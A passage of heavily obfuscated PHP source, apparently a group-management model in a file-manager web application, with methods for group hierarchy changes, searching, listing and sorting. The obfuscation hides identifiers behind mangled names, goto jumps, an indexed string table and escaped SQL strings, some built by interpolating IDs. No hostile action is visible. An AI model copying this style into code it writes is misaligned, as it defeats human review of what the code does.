$this->getInfoSimple($f¨­Ã‹øÉ£[$FîÙ¯· [469]]); if (!$A”±Õ¨÷„Œ || !$d¶‡ºõÆƒ) { return !1; } if ($A”±Õ¨÷„Œ[$FîÙ¯· [2102]] == $d¶‡ºõÆƒ[$FîÙ¯· [2102]]) { return !1; } if ($f¨­Ã‹øÉ£[$FîÙ¯· [469]] != $A”±Õ¨÷„Œ[$FîÙ¯· [469]]) { if ($d¶‡ºõÆƒ[$FîÙ¯· [467]] !== $A”±Õ¨÷„Œ[$FîÙ¯· [467]] && strpos($d¶‡ºõÆƒ[$FîÙ¯· [467]], $A”±Õ¨÷„Œ[$FîÙ¯· [467]] . $A”±Õ¨÷„Œ[$FîÙ¯· [2102]] . $FîÙ¯· [57]) === 0) { return !1; } $f¨­Ã‹øÉ£[$FîÙ¯· [533]] = $d¶‡ºõÆƒ[$FîÙ¯· [467]] . $f¨­Ã‹øÉ£[$FîÙ¯· [469]] . $FîÙ¯· [57]; $this->_changeChildLevel($A”±Õ¨÷„Œ, $d¶‡ºõÆƒ); } } if (isset($f¨­Ã‹øÉ£[$FîÙ¯· [38]])) { $this->setNamePinyin($cÚé³•ÑÊ„, $f¨­Ã‹øÉ£[$FîÙ¯· [38]]); } if (isset($f¨­Ã‹øÉ£[$FîÙ¯· [2174]])) { $this->metaSet($cÚé³•ÑÊ„, array($FîÙ¯· [2174] => $f¨­Ã‹øÉ£[$FîÙ¯· [2174]], $FîÙ¯· [2175] => $f¨­Ã‹øÉ£[$FîÙ¯· [2175]])); unset($f¨­Ã‹øÉ£[$FîÙ¯· [2174]]); unset($f¨­Ã‹øÉ£[$FîÙ¯· [2175]]); } return $this->where(array($FîÙ¯· [2176] => $cÚé³•ÑÊ„))->save($f¨­Ã‹øÉ£); } private function _changeChildLevel($CÛˆŠ•Šçå, $F´ºÂéÙ÷¡, $B³Æ‡„İ = false) { goto fî±‡ÈÈùã; bÈ”¨ÕÁš˜: $this->where($DÓÇ’ø¡Ê)->data($fï¸ĞÄ…‘¹)->save(); goto DïÕç¬´µ±; fî±‡ÈÈùã: $A†¾İ¾çŒÏ =& $_SERVER[©]; $Cã‹ŠØÛ™ = $CÛˆŠ•Šçå[$A†¾İ¾çŒÏ[467]] . $CÛˆŠ•Šçå[$A†¾İ¾çŒÏ[2102]] . $A†¾İ¾çŒÏ[57]; $B‘İò›ã‹Ï = $F´ºÂéÙ÷¡[$A†¾İ¾çŒÏ[467]] . $F´ºÂéÙ÷¡[$A†¾İ¾çŒÏ[2102]] . $A†¾İ¾çŒÏ[57] . $CÛˆŠ•Šçå[$A†¾İ¾çŒÏ[2102]] . $A†¾İ¾çŒÏ[57]; goto Aİµ¥Ìèá´; Aİµ¥Ìèá´: if ($B³Æ‡„İ) { $B‘İò›ã‹Ï = $F´ºÂéÙ÷¡[$A†¾İ¾çŒÏ[467]] . $F´ºÂéÙ÷¡[$A†¾İ¾çŒÏ[2102]] . $A†¾İ¾çŒÏ[57]; } $DÓÇ’ø¡Ê = array($A†¾İ¾çŒÏ[533] => array($A†¾İ¾çŒÏ[491], $CÛˆŠ•Šçå[$A†¾İ¾çŒÏ[467]] . $CÛˆŠ•Šçå[$A†¾İ¾çŒÏ[2102]] . $A†¾İ¾çŒÏ[492])); $fï¸ĞÄ…‘¹ = array($A†¾İ¾çŒÏ[533] => array($A†¾İ¾çŒÏ[542], "\162\x65\160\154\141\143\x65\50\160\x61\x72\x65\156\x74\x4c\x65\166\x65\154\54\x27{$Cã‹ŠØÛ™}\47\54\x27{$B‘İò›ã‹Ï}\x27\51")); goto bÈ”¨ÕÁš˜; DïÕç¬´µ±: } public function setNamePinyin($fá‘áÏçÊ¯, $fëÔ¦ŞÂ›º = false) { $FØ‚¢§Ù´© =& $_SERVER[©]; if (!$fëÔ¦ŞÂ›º) { $cç³¶¹×¬Ü = $this->getInfoSimple($fá‘áÏçÊ¯); $fëÔ¦ŞÂ›º = $cç³¶¹×¬Ü[$FØ‚¢§Ù´©[38]]; } if (!Input::check($fëÔ¦ŞÂ›º, $FØ‚¢§Ù´©[536])) { $this->metaSet($fá‘áÏçÊ¯, $FØ‚¢§Ù´©[424], null); $this->metaSet($fá‘áÏçÊ¯, $FØ‚¢§Ù´©[423], null); return; } $c²äÈ¦…Å = array($FØ‚¢§Ù´©[424] => str_replace($FØ‚¢§Ù´©[60], $FØ‚¢§Ù´©[43], Pinyin::encode($fëÔ¦ŞÂ›º)), $FØ‚¢§Ù´©[423] => Pinyin::encode($fëÔ¦ŞÂ›º, $FØ‚¢§Ù´©[537])); $this->metaSet($fá‘áÏçÊ¯, $c²äÈ¦…Å); } protected function groupStatus($Cœƒ¯‚„øé, $d½ÑØâÆÒõ) { goto CŒÇÓ¤­èä; CŒÇÓ¤­èä: $EÀòœìÌ„ä =& $_SERVER[©]; $cİ„ùˆ× = $this->getInfoSimple($Cœƒ¯‚„øé); if (!$cİ„ùˆ×) { return !1; } goto Bãô±»Šî§; B…¶Ãå³‰„: foreach ($C÷¤‹³Òİ¹ as $Cœƒ¯‚„øé) { $B‘¢Æâ¡ŸÄ[] = array($EÀòœìÌ„ä[2102] => $Cœƒ¯‚„øé, $EÀòœìÌ„ä[99] => $EÀòœìÌ„ä[688], $EÀòœìÌ„ä[368] => $d½ÑØâÆÒõ); } return Model($EÀòœìÌ„ä[2177])->addAll($B‘¢Æâ¡ŸÄ, array(), !0); goto C‡†É¬…è; Bãô±»Šî§: if ($d½ÑØâÆÒõ == $EÀòœìÌ„ä[93]) { $C÷¤‹³Òİ¹ = $this->parentLevelArray($cİ„ùˆ×[$EÀòœìÌ„ä[467]]); } else { $D«ÊìØÙ¿ö = array($EÀòœìÌ„ä[533] => array($EÀòœìÌ„ä[491], $cİ„ùˆ×[$EÀòœìÌ„ä[467]] . $cİ„ùˆ×[$EÀòœìÌ„ä[2102]] . $EÀòœìÌ„ä[492])); $C÷¤‹³Òİ¹ = $this->where($D«ÊìØÙ¿ö)->field($EÀòœìÌ„ä[2102])->select(); $C÷¤‹³Òİ¹ = array_to_keyvalue($C÷¤‹³Òİ¹, $EÀòœìÌ„ä[43], $EÀòœìÌ„ä[2102]); } $C÷¤‹³Òİ¹[] = $cİ„ùˆ×[$EÀòœìÌ„ä[2102]]; $B‘¢Æâ¡ŸÄ = array(); goto B…¶Ãå³‰„; C‡†É¬…è: } private function _groupStatusApply($A„°…ÔŞ¦, $A °…¯Œæ) { $d¡£Ì ĞÅ§ =& $_SERVER[©]; if ($A °…¯Œæ == $d¡£Ì ĞÅ§[93]) { $cƒÆá¸š½è = $this->parentLevelArray($A„°…ÔŞ¦[$d¡£Ì ĞÅ§[467]]); } else { $D¯©ÌÙœÁ¶ = array($d¡£Ì ĞÅ§[533] => array($d¡£Ì ĞÅ§[491], $A„°…ÔŞ¦[$d¡£Ì ĞÅ§[467]] . $A„°…ÔŞ¦[$d¡£Ì ĞÅ§[2102]] . $d¡£Ì ĞÅ§[492])); $cƒÆá¸š½è = $this->where($D¯©ÌÙœÁ¶)->field($d¡£Ì ĞÅ§[2102])->select(); $cƒÆá¸š½è = array_to_keyvalue($cƒÆá¸š½è, $d¡£Ì ĞÅ§[43], $d¡£Ì ĞÅ§[2102]); } if (empty($cƒÆá¸š½è)) { return; } $fŞšÚé­¢ = array(); foreach ($cƒÆá¸š½è as $Eã²’Á”Š) { $fŞšÚé­¢[] = array($d¡£Ì ĞÅ§[2102] => $Eã²’Á”Š, $d¡£Ì ĞÅ§[99] => $d¡£Ì ĞÅ§[688], $d¡£Ì ĞÅ§[368] => $A °…¯Œæ); } Model($d¡£Ì ĞÅ§[2177])->addAll($fŞšÚé­¢, array(), !0); } protected function groupRemove($Fá¨±¸ĞÅØ) { goto a½£çÀ·¥; Fß ƒ¨ÇÄ: Model($bÌ³‹£¢Ù[752])->groupRootRemove($Fá¨±¸ĞÅØ); return $this->where($BŠ»ï¥°Íè)->delete(); goto eŸ½Å×˜ÎÄ; a½£çÀ·¥: $bÌ³‹£¢Ù =& $_SERVER[©]; $BŠ»ï¥°Íè = array($bÌ³‹£¢Ù[2102] => $Fá¨±¸ĞÅØ); $bŒ²Âëâ£› = $this->where($BŠ»ï¥°Íè)->find(); goto b¨ßµˆÉ÷; fŒšêÓ•±ù: $this->where(array($bÌ³‹£¢Ù[469] => $Fá¨±¸ĞÅØ))->save(array($bÌ³‹£¢Ù[469] => $bŒ²Âëâ£›[$bÌ³‹£¢Ù[469]])); Model($bÌ³‹£¢Ù[2177])->where($BŠ»ï¥°Íè)->delete(); Model($bÌ³‹£¢Ù[2178])->where($BŠ»ï¥°Íè)->delete(); goto Fß ƒ¨ÇÄ; b¨ßµˆÉ÷: if (!$bŒ²Âëâ£› || $bŒ²Âëâ£›[$bÌ³‹£¢Ù[469]] == 0) { return !1; } $D¹­†»ší² = $this->getInfoSimple($bŒ²Âëâ£›[$bÌ³‹£¢Ù[469]]); $this->_changeChildLevel($bŒ²Âëâ£›, $D¹­†»ší², !0); goto fŒšêÓ•±ù; eŸ½Å×˜ÎÄ: } protected function groupSort($dˆÁãÃÃàò) { $a¨ôÁ»åñŞ =& $_SERVER[©]; $eÃ¾˜Şà§š = array(); foreach ($dˆÁãÃÃàò as $bïš‹ó ÅÎ => $AĞã‚ğ‹¿) { $eÃ¾˜Şà§š[] = array($a¨ôÁ»åñŞ[2102], $AĞã‚ğ‹¿, $a¨ôÁ»åñŞ[2123], $bïš‹ó ÅÎ + 1); } $this->saveAll($eÃ¾˜Şà§š); } public function listData() { $AïÓãÓ×› = $this->_makeOrder()->selectPage(50); $this->_listDataApply($AïÓãÓ×›[$_SERVER[©][363]]); return $AïÓãÓ×›; } private function _makeOrder($E•Ç™¹æÆ = '') { goto Cò¾’¹‘Î; Cç¶áËÊÛø: $DŞİï¢•ù = Input::get($aº±‚Ç»í«[415], $aº±‚Ç»í«[17], $aº±‚Ç»í«[2106], $aàŒìƒÂ¼Š); $AÚÚÖ…ä‘ = Input::get($aº±‚Ç»í«[416], $aº±‚Ç»í«[17], $aº±‚Ç»í«[2179], array($aº±‚Ç»í«[2179], $aº±‚Ç»í«[412])); $AÚÚÖ…ä‘ = $BÙÃ¹ğ¥ëÙ[$AÚÚÖ…ä‘]; goto EƒÚåˆ‡ò; Cò¾’¹‘Î: $aº±‚Ç»í« =& $_SERVER[©]; $aàŒìƒÂ¼Š = array($aº±‚Ç»í«[2102], $aº±‚Ç»í«[38], $aº±‚Ç»í«[2088], $aº±‚Ç»í«[197]); $BÙÃ¹ğ¥ëÙ = array($aº±‚Ç»í«[410] => $aº±‚Ç»í«[411], $aº±‚Ç»í«[412] => $aº±‚Ç»í«[413]); goto Cç¶áËÊÛø; EƒÚåˆ‡ò: $E•Ç™¹æÆ = $E•Ç™¹æÆ . "{$DŞİï¢•ù}\40{$AÚÚÖ…ä‘}\x2c\40\147\x72\157\165\160\111\x44\40\x61\x73\143"; return $this->order($E•Ç™¹æÆ); goto b©®Ìö¶Æ­; b©®Ìö¶Æ­: } public function listChild($c»¿õÔßÀä) { $fÙ‘Û°è =& $_SERVER[©]; $AÌïÑöçÚï = $this->where(array($fÙ‘Û°è[469] => $c»¿õÔßÀä))->_makeOrder()->selectPage(200); $this->_listDataApply($AÌïÑöçÚï[$fÙ‘Û°è[363]]); return $AÌïÑöçÚï; } public function listByID($aèê¾®™¨) { $B”áèÛÓ˜¨ =& $_SERVER[©]; if (!$aèê¾®™¨) { return array(); } $F‘øÎÍæ²é = array($B”áèÛÓ˜¨[2102] => array($B”áèÛÓ˜¨[17], $aèê¾®™¨)); $bÎÕĞòÁ = $this->where($F‘øÎÍæ²é)->select(); $this->_listDataApply($bÎÕĞòÁ); return $bÎÕĞòÁ; } public function listSearch($dõ÷»íÚÛÆ) { goto Aœó³ÖÂ‡‹; d¥ÕòÎŠ‚: if ($A¾Ïï†£ˆ) { $AóÁë¬ØéÖ = $this->getInfoSimple($A¾Ïï†£ˆ); $fàÖí“ÆÔµ = $AóÁë¬ØéÖ[$a¤¼œ¼¬åÇ[467]] . $A¾Ïï†£ˆ . $a¤¼œ¼¬åÇ[492]; $f«æá…òäİ = array($f«æá…òäİ, array($a¤¼œ¼¬åÇ[467] => array($a¤¼œ¼¬åÇ[751], $fàÖí“ÆÔµ))); } $aÎ¹œåä”Û = $this->_makeOrder()->where($f«æá…òäİ)->selectPage(20); $aÎ¹œåä”Û = $aÎ¹œåä”Û ? $aÎ¹œåä”Û : array(); goto dÄá¶é¹‡’; dÄá¶é¹‡’: if (!$aÎ¹œåä”Û || count($aÎ¹œåä”Û[$a¤¼œ¼¬åÇ[363]]) < 5 && Input::check($C«ÖÔÔšµ, $a¤¼œ¼¬åÇ[315])) { goto AÄ‰ÆĞ¾œ; BÓ¿™ì®æ¢: $a¸Ğå¸°´ë = array_merge($A£ğ§äò’Ë, $D„ÎÊÉ¥»Œ, $aÎ¹œåä”Û[$a¤¼œ¼¬åÇ[363]]); $aÎ¹œåä”Û[$a¤¼œ¼¬åÇ[363]] = array_unique_by_key($a¸Ğå¸°´ë, $a¤¼œ¼¬åÇ[2102]); $aÎ¹œåä”Û[$a¤¼œ¼¬åÇ[360]][$a¤¼œ¼¬åÇ[361]] = count($aÎ¹œåä”Û[$a¤¼œ¼¬åÇ[363]]); goto b°ô¿âŸ; b°ô¿âŸ: $aÎ¹œåä”Û[$a¤¼œ¼¬åÇ[360]][$a¤¼œ¼¬åÇ[362]] = ceil($aÎ¹œåä”Û[$a¤¼œ¼¬åÇ[360]][$a¤¼œ¼¬åÇ[361]] / $aÎ¹œåä”Û[$a¤¼œ¼¬åÇ[360]][$a¤¼œ¼¬åÇ[358]]); goto d‘éåæÊùí; AÄ‰ÆĞ¾œ: $A‰ª×¼êø = $this->groupChildrenAll($A¾Ïï†£ˆ); $A£ğ§äò’Ë = $this->_searchFromMeta($a¤¼œ¼¬åÇ[423], $C«ÖÔÔšµ, 10, $A‰ª×¼êø); $D„ÎÊÉ¥»Œ = $this->_searchFromMeta($a¤¼œ¼¬åÇ[424], $C«ÖÔÔšµ, 10, $A‰ª×¼êø); goto BÓ¿™ì®æ¢; d‘éåæÊùí: } $this->_listDataApply($aÎ¹œåä”Û[$a¤¼œ¼¬åÇ[363]]); return $aÎ¹œåä”Û; goto cŠÇ¼„¯¤; Aœó³ÖÂ‡‹: $a¤¼œ¼¬åÇ =& $_SERVER[©]; $C«ÖÔÔšµ = $dõ÷»íÚÛÆ[$a¤¼œ¼¬åÇ[2180]]; $A¾Ïï†£ˆ = isset($dõ÷»íÚÛÆ[$a¤¼œ¼¬åÇ[2181]]) ? $dõ÷»íÚÛÆ[$a¤¼œ¼¬åÇ[2181]] : !1; goto EìË«ù‡Ó; EìË«ù‡Ó: if (!trim($C«ÖÔÔšµ)) { return !1; } $C«ÖÔÔšµ = str_replace($a¤¼œ¼¬åÇ[2182], $a¤¼œ¼¬åÇ[2183], $C«ÖÔÔšµ); $f«æá…òäİ = array($a¤¼œ¼¬åÇ[2102] => array($a¤¼œ¼¬åÇ[751], "\x25{$C«ÖÔÔšµ}\45"), $a¤¼œ¼¬åÇ[38] => array($a¤¼œ¼¬åÇ[751], "\45{$C«ÖÔÔšµ}\x25"), $a¤¼œ¼¬åÇ[911] => $a¤¼œ¼¬åÇ[2184]); goto d¥ÕòÎŠ‚; cŠÇ¼„¯¤: } protected function groupChildrenAll($EÁ°²™éÍ‡) { $D£äÇÑ…Ô =& $_SERVER[©]; if (!$EÁ°²™éÍ‡) { return !1; } if (is_string($EÁ°²™éÍ‡)) { $EÁ°²™éÍ‡ = array($EÁ°²™éÍ‡); } $Aâù»áÈ¤» = $EÁ°²™éÍ‡; foreach ($EÁ°²™éÍ‡ as $A”³®Ó­Á) { $b•³šÓ›¬¬ = $this->getInfoSimple($A”³®Ó­Á); $AÇÜŠ«ïË„ = array($D£äÇÑ…Ô[467] => array($D£äÇÑ…Ô[751], $b•³šÓ›¬¬[$D£äÇÑ…Ô[467]] . $A”³®Ó­Á . $D£äÇÑ…Ô[492])); $Fñ³®„¡± = $this->field($D£äÇÑ…Ô[2102])->where($AÇÜŠ«ïË„)->select(); $Aâù»áÈ¤» = array_merge($Aâù»áÈ¤», array_to_keyvalue($Fñ³®„¡±, $D£äÇÑ…Ô[43], $D£äÇÑ…Ô[2102])); } return array_unique($Aâù»áÈ¤»); } private function _searchFromMeta($F³”ÔØğ­, $f‚ƒ•ğ™Œù, $Eïí…º—…Õ, $e‹˜Ü‰‰¹™) { goto dÅÓ®Ù•êİ; dÅÓ®Ù•êİ: $F¤ƒéòæ =& $_SERVER[©]; $f‚ƒ•ğ™Œù = strtolower($f‚ƒ•ğ™Œù); $cØã·Üİªš = array($F¤ƒéòæ[99] => $F³”ÔØğ­, $F¤ƒéòæ[368] => array($F¤ƒéòæ[751], "\x25{$f‚ƒ•ğ™Œù}\x25")); goto aËËóãâÛ; aÍï‹ÑÕ®­: return $C‡˜ä…¦ÃÉ; goto f™£İ”¤öÒ; dóŒò«‰•í: $eÇŒ™Ç‰» = array_to_keyvalue($eÇŒ™Ç‰», $F¤ƒéòæ[43], $F¤ƒéòæ[2102]); $C‡˜ä…¦ÃÉ = $this->where(array($F¤ƒéòæ[2176] => array($F¤ƒéòæ[17], $eÇŒ™Ç‰»)))->select(); if (!$C‡˜ä…¦ÃÉ) { return array(); } goto aÍï‹ÑÕ®­; aËËóãâÛ: if ($e‹˜Ü‰‰¹™) { $cØã·Üİªš[$F¤ƒéòæ[2102]] = array($F¤ƒéòæ[17], $e‹˜Ü‰‰¹™); } $eÇŒ™Ç‰» = Model($F¤ƒéòæ[2185])->where($cØã·Üİªš)->limit($Eïí…º—…Õ)->select(); if (!$eÇŒ™Ç‰») { return array(); } goto dóŒò«‰•í; f™£İ”¤öÒ: } protected function _listDataApplyItem($AéÙ£‰Ì–) { $B¸æ–™Ï¢¤ = array($AéÙ£‰Ì–); $this->_listDataApply($B¸æ–™Ï¢¤); return $B¸æ–™Ï¢¤[0]; } protected function _listDataApply(&$EÊÃµÕ¨ó×) { goto Cß‹éª‚ ; Cß‹éª‚ : $cåŒĞÇã©° =& $_SERVER[©]; if (!$EÊÃµÕ¨ó×) { return; } $B„ù§õ„¢“ = array_to_keyvalue($EÊÃµÕ¨ó×, $cåŒĞÇã©°[43], $cåŒĞÇã©°[2102]); goto A£Ã™‹·’ã; A£Ã™‹·’ã: $this->_listAppendChildren($EÊÃµÕ¨ó×); $this->_listAppendChildrenMember($EÊÃµÕ¨ó×); $this->_listAppendMeta($EÊÃµÕ¨ó×, $B„ù§õ„¢“); goto DÄô´è‰ˆ; DÄô´è‰ˆ: $this->_listAppendParent($EÊÃµÕ¨ó×); $this->_listAppendSourceRoot($EÊÃµÕ¨ó×, $B„ù§õ„¢“); goto C“Ü‚»®Ø; C“Ü‚»®Ø: } private function _listAppendChildren(&$D‡¤êÃ‰ë) { goto bÁ’›Š…œ; A²«™ƒ‡ºî: $d–’ŞŒ¡„Ÿ = count($D‡¤êÃ‰ë); $AÙéìÔÌ´Í = $this->tablePrefix . $this->tableName; for ($E‘¼äë‹…ô = 0, $b…µ“°äŞŠ = 0; $E‘¼äë‹…ô < $d–’ŞŒ¡„Ÿ; $E‘¼äë‹…ô++) { $b…µ“°äŞŠ++; $Cçõ„­»½ = $D‡¤êÃ‰ë[$E‘¼äë‹…ô][$c³²ëà¢ï[2102]]; $bØÂ¥Ú¥Áó .= "\x53\x45\114\x45\103\124\40\x2a\40\106\x52\117\x4d\40\x28\123\x45\x4c\105\103\x54\40\47{$Cçõ„­»½}\x5f\143\150\151\x6c\x64\x27\40\x61\163\40\x68\x61\x73\x20\106\x52\x4f\115\40\x60{$AÙéìÔÌ´Í}\140\x20\x77\x68\x65\162\x65\40\x70\141\162\x65\156\164\x49\x44\75{$Cçõ„­»½}\40\x6c\151\155\x69\x74\x20\x31\x29\40\x61\163\40\x74\142\x5f{$Cçõ„­»½}\40\165\x6e\x69\x6f\156\40\141\x6c\154\40"; if (($b…µ“°äŞŠ >= 20 || $E‘¼äë‹…ô == $d–’ŞŒ¡„Ÿ - 1) && $bØÂ¥Ú¥Áó) { $bØÂ¥Ú¥Áó = substr($bØÂ¥Ú¥Áó, 0, -strlen($c³²ëà¢ï[457])); $BÂ‘º‚ëË = $this->query($bØÂ¥Ú¥Áó); $D°ã©¸œƒ = array_merge($D°ã©¸œƒ, $BÂ‘º‚ëË); $b…µ“°äŞŠ = 0; $bØÂ¥Ú¥Áó = $c³²ëà¢ï[43]; } } goto aãñÄùò©°; bÁ’›Š…œ: $c³²ëà¢ï =& $_SERVER[©]; $bØÂ¥Ú¥Áó = $c³²ëà¢ï[13]; $D°ã©¸œƒ = array(); goto A²«™ƒ‡ºî; aãñÄùò©°: $D°ã©¸œƒ = array_to_keyvalue($D°ã©¸œƒ, $c³²ëà¢ï[458]); foreach ($D‡¤êÃ‰ë as &$Aë¹Ş£Ë) { $Aë¹Ş£Ë[$c³²ëà¢ï[2186]] = isset($D°ã©¸œƒ[$Aë¹Ş£Ë[$c³²ëà¢ï[2102]] . $c³²ëà¢ï[2187]]); } goto eĞÌ¿Œ÷Ö; eĞÌ¿Œ÷Ö: } private function _listAppendChildrenMember(&$D­Ë‡…Ã÷¢) { goto eÆŸ‡·µ¿ã; A‚ëÔ±èç: $eĞ—¤êŒÌÃ = count($D­Ë‡…Ã÷¢); $Dëº°ÍÙŸœ = $this->tablePrefix . $c†©°ÂæŒİ[2178]; for ($Fï´‘´ˆÔŠ = 0, $d¥Ø…ß ÑÌ = 0; $Fï´‘´ˆÔŠ < $eĞ—¤êŒÌÃ; $Fï´‘´ˆÔŠ++) { $d¥Ø…ß ÑÌ++; $CÑ­›à˜â = $D­Ë‡…Ã÷¢[$Fï´‘´ˆÔŠ][$c†©°ÂæŒİ[2102]]; $cõêôèÛÅ° .= "\123\105\x4c\105\x43\124\40\x2a\x20\106\x52\x4f\x4d\x20\50\x53\x45\x4c\x45\103\x54\x20\x27{$CÑ­›à˜â}\137\x63\x68\151\x6c\144\x27\40\141\163\x20\x68\141\163\x20\x46\122\117\x4d\x20\x60{$Dëº°ÍÙŸœ}\x60\x20\167\150\x65\162\145\x20\x67\x72\x6f\165\160\x49\104\75{$CÑ­›à˜â}\40\154\x69\155\x69\x74\40\61\x29\40\x61\163\x20\x74\142\x5f{$CÑ­›à˜â}\x20\165\156\151\x6f\156\40\x61\154\x6c\40"; if (($d¥Ø…ß ÑÌ >= 20 || $Fï´‘´ˆÔŠ == $eĞ—¤êŒÌÃ - 1) && $cõêôèÛÅ°) { $cõêôèÛÅ° = substr($cõêôèÛÅ°, 0, -strlen($c†©°ÂæŒİ[457])); $eï‘™œç« = $this->query($cõêôèÛÅ°); $Aºæ íŒ·ß = array_merge($Aºæ íŒ·ß, $eï‘™œç«); $d¥Ø…ß ÑÌ = 0; $cõêôèÛÅ° = $c†©°ÂæŒİ[43]; } } goto f³³ßÈ–Æ–; f³³ßÈ–Æ–: $Aºæ íŒ·ß = array_to_keyvalue($Aºæ íŒ·ß, $c†©°ÂæŒİ[458]); foreach ($D­Ë‡…Ã÷¢ as &$cŒõ‚½Õ¬¯) { $cŒõ‚½Õ¬¯[$c†©°ÂæŒİ[2188]] = isset($Aºæ íŒ·ß[$cŒõ‚½Õ¬¯[$c†©°ÂæŒİ[2102]] . $c†©°ÂæŒİ[2187]]); } goto CĞ‰Í÷‰Ç; eÆŸ‡·µ¿ã: $c†©°ÂæŒİ =& $_SERVER[©]; $cõêôèÛÅ° = $c†©°ÂæŒİ[13]; $Aºæ íŒ·ß = array(); goto A‚ëÔ±èç; CĞ‰Í÷‰Ç: } private function _listAppendMeta(&$fÖÇÓ¿Ğ‘Ì, $f¾’Ü‡´²Û) { $eê´Æ®Û²¼ =& $_SERVER[©]; $AÀ°¬í¾¤ = array($eê´Æ®Û²¼[2102] => array($eê´Æ®Û²¼[17], $f¾’Ü‡´²Û)); $C¤ò»Ïéß´ = Model($eê´Æ®Û²¼[2177])->where($AÀ°¬í¾¤)->select(); $C¤ò»Ïéß´ = array_to_keyvalue_group($C¤ò»Ïéß´, $eê´Æ®Û²¼[2102]); foreach ($C¤ò»Ïéß´ as &$DÂƒÙß´•„) { $DÂƒÙß´•„ = array_to_keyvalue($DÂƒÙß´•„, $eê´Æ®Û²¼[99], $eê´Æ®Û²¼[368]); } foreach ($fÖÇÓ¿Ğ‘Ì as &$føöÀÛŸÚ…) { $føöÀÛŸÚ…[$eê´Æ®Û²¼[425]] = array(); if (isset($C¤ò»Ïéß´[$føöÀÛŸÚ…[$eê´Æ®Û²¼[2102]]])) { $føöÀÛŸÚ…[$eê´Æ®Û²¼[425]] = $C¤ò»Ïéß´[$føöÀÛŸÚ…[$eê´Æ®Û²¼[2102]]]; } } } protected function parentLevelArray($eºê—ñğÚ®) { $e½òá×¥Ô› =& $_SERVER[©]; $eºê—ñğÚ® = explode($e½òá×¥Ô›[57], trim($eºê—ñğÚ®, $e½òá×¥Ô›[57])); $eºê—ñğÚ® = array_remove_value($eºê—ñğÚ®, $e½òá×¥Ô›[476]); return $eºê—ñğÚ®; } private function _listAppendParent(&$BŒì™„Åƒ) { goto bòö¸õµ¦; AòÍ˜Âã: $Aˆ³ºÔ¹Ãë = array(); foreach ($Cìµ¦áô‡ as $eô£½Û‹·’ => $cİÚ¸§á†) { if (!$cİÚ¸§á†) { $Aˆ³ºÔ¹Ãë[] = $eô£½Û‹·’; } } if ($Aˆ³ºÔ¹Ãë) { $AøñÄÜ— = array($aåçôÙöçâ[2176] => array($aåçôÙöçâ[392], $Aˆ³ºÔ¹Ãë)); $b¥ôÁÏ½Ú¶ = $this->field($aåçôÙöçâ[2189])->where($AøñÄÜ—)->select(); $cğ£Šø¸ô® = array_to_keyvalue($b¥ôÁÏ½Ú¶, $aåçôÙöçâ[2102], $aåçôÙöçâ[38]); $Cìµ¦áô‡ = array_merge_index($Cìµ¦áô‡, $cğ£Šø¸ô®); } goto b­«¨çÎè; bòö¸õµ¦: $aåçôÙöçâ =& $_SERVER[©]; $Cìµ¦áô‡ = array(); foreach ($BŒì™„Åƒ as &$e¿è•“ŸË) { $Cìµ¦áô‡[$e¿è•“ŸË[$aåçôÙöçâ[2102]]] = $e¿è•“ŸË[$aåçôÙöçâ[38]]; $D…†àİ©ø = $this->parentLevelArray($e¿è•“ŸË[$aåçôÙöçâ[467]]); foreach ($D…†àİ©ø as $F…‡ñÀÅª) { if (!isset($Cìµ¦áô‡[$F…‡ñÀÅª])) { $Cìµ¦áô‡[$F…‡ñÀÅª] = 0; } } } goto AòÍ˜Âã; b­«¨çÎè: $bö¤´´³Ì = $GLOBALS[$aåçôÙöçâ[16]][$aåçôÙöçâ[94]][$aåçôÙöçâ[2190]]; foreach ($BŒì™„Åƒ as &$e¿è•“ŸË) { $D…†àİ©ø = $this->parentLevelArray($e¿è•“ŸË[$aåçôÙöçâ[467]]); $Dáõ©÷¼ë = $aåçôÙöçâ[43]; foreach ($D…†àİ©ø as $eô£½Û‹·’ => $F…‡ñÀÅª) { if ($bö¤´´³Ì && $eô£½Û‹·’ == 0) { continue; } $Dáõ©÷¼ë .= $Cìµ¦áô‡[$F…‡ñÀÅª] . $aåçôÙöçâ[18]; } if ($D…†àİ©ø) { $Dáõ©÷¼ë .= $e¿è•“ŸË[$aåçôÙöçâ[38]]; } $e¿è•“ŸË[$aåçôÙöçâ[471]] = str_replace($aåçôÙöçâ[475], $aåçôÙöçâ[18], $Dáõ©÷¼ë); } goto fà¶ŒÊ‘Û; fà¶ŒÊ‘Û: } private function _listAppendSourceRoot(&$DÑÎ®•çĞÁ, $DˆğÌŞ¡½) { goto e¬ÉÇ•ƒ…Ä; f±µÎŒ•é®: foreach ($DÑÎ®•çĞÁ as &$c¾ŞÜ¶ ­Â) { $c¾ŞÜ¶ ­Â[$bÉ£Ğ¿’›˜[399]] = $CõÏ–ªò³Ô[$c¾ŞÜ¶ ­Â[$bÉ£Ğ¿’›˜[2102]]] ? $CõÏ–ªò³Ô[$c¾ŞÜ¶ ­Â[$bÉ£Ğ¿’›˜[2102]]] : array(); } goto f¿·íâº; Cßˆˆªº³: $CõÏ–ªò³Ô = Model($bÉ£Ğ¿’›˜[752])->order($bÉ£Ğ¿’›˜[2192])->field($Bç±èïâ´Ç)->where($díÑ´‚ÏÇ’)->select(); $CõÏ–ªò³Ô = array_to_keyvalue($CõÏ–ªò³Ô, $bÉ£Ğ¿’›˜[464]); $CõÏ–ªò³Ô = array_remove_key($CõÏ–ªò³Ô, $bÉ£Ğ¿’›˜[464]); goto f±µÎŒ•é®; e¬ÉÇ•ƒ…Ä: $bÉ£Ğ¿’›˜ =& $_SERVER[©]; $díÑ´‚ÏÇ’ = array($bÉ£Ğ¿’›˜[379] => SourceModel::TYPE_GROUP, $bÉ£Ğ¿’›˜[469] => 0, $bÉ£Ğ¿’›˜[464] => array($bÉ£Ğ¿’›˜[17], $DˆğÌŞ¡½)); $Bç±èïâ´Ç = $bÉ£Ğ¿’›˜[2191]; goto Cßˆˆªº³; f¿·íâº: } protected function groupMerge($f‚‹ËÜ‹‘) { $f‚‹ËÜ‹‘ = array_unique($f‚‹ËÜ‹‘); $BÈÛèÏÔˆñ = array(); for ($f‹àÇ³É˜† = 0; $f‹àÇ³É˜† < count($f‚‹ËÜ‹‘); $f‹àÇ³É˜†++) { $a«ÉšÚö = !1; for ($A‘×‘ˆŸññ = 0; $A‘×‘ˆŸññ < count($f‚‹ËÜ‹‘); $A‘×‘ˆŸññ++) { if ($f‹àÇ³É˜† == $A‘×‘ˆŸññ) { continue; } if ($this->isParentOf($f‚‹ËÜ‹‘[$A‘×‘ˆŸññ], $f‚‹ËÜ‹‘[$f‹àÇ³É˜†])) { 